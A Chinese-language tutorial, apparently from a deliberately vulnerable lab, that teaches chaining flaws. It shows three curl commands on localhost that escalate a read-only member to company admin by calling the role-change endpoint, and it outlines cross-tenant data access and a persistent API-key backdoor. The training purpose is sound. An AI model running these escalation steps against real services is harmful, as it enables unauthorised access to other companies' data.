# 教程 05: 高级组合攻击

## 概念

单独一个漏洞可能影响有限，但组合多个漏洞可以实现深度渗透。

**难度**: ★★★★ (专家)

## 场景 1: 从只读成员到企业管理员

1. **V-01**: 发现只读成员可以调用 VPS 控制接口
2. **V-05**: 利用角色修改接口将自己提升为管理员
3. **H-02**: 枚举企业内所有用户的信息
4. **结果**: 从一个只能查看的用户变成了企业最高权限

```bash
# Step 1: 发现隐藏接口
curl -X POST http://localhost:8080/api/v1/vps/1/start \
  -H "Authorization: Bearer <viewer-token>"
# → 200 OK, works!

# Step 2: 修改自身角色
curl -X PUT http://localhost:8080/api/v1/company/members/<self-id>/role \
  -H "Authorization: Bearer <viewer-token>" \
  -d '{"role":"admin"}'

# Step 3: 验证新权限
curl http://localhost:8080/api/v1/company/members \
  -H "Authorization: Bearer <viewer-token>"
```

## 场景 2: 跨企业数据泄露

1. **C-01**: 操作其他企业的 VPS
2. **H-03**: 读取其他企业的订单
3. **H-04**: 查看其他企业的工单

## 场景 3: 持久后门

1. **V-05**: 提升角色权限
2. **H-05**: 创建高权限 API Key
3. **C-03**: 即使 Key 被吊销仍可访问

→ [教程 06: WriteUp 参考](06-writeups.md)
